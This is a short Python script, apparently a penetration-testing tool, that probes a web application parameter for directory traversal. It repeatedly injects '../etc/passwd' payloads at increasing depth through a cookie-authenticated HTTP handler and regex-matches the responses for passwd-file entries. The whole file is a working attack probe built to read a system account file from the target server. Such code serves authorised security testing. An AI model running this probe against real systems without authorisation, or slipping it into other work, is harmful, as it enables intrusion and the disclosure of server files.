from RequestPayloader import HTTPRequestHandler
import re
import sys

def check_for_etcpasswd(response):
    # regex for lines in passwd file
    regex = "([a-zA-Z-_]+):x:([0-9]+):([0-9]+):([a-zA-Z0-9- ]*):([/a-zA-Z]+):([/a-zA-Z]+)"
    
    # if there aren't arny lines from passwd, this will be None
    if re.search(regex, response) is None:
        return False # no dirtraversall possible

    return True

def main():

    # user input
    if sys.argv.__len__() < 5:
        print("Error, not all suficient arguments were passed.")
        exit(-1)
    base_url = sys.argv[1]
    file_param = sys.argv[2]
    cookie = sys.argv[3]
    depth = int(sys.argv[4])
    
    handler = HTTPRequestHandler(base_url, cookie)
    path = "../etc/passwd"
    for i in range(depth):
        response = handler.send_request(param=file_param, new_value=path)
        if check_for_etcpasswd(response.text) is True:
            print(f"dirtraversall possbie. path: {path}")
            exit(0)
        else:
            path = "../"+path

    print("dirtraversall not found in given scope")


if __name__ == "__main__":
    main()
    exit(0)
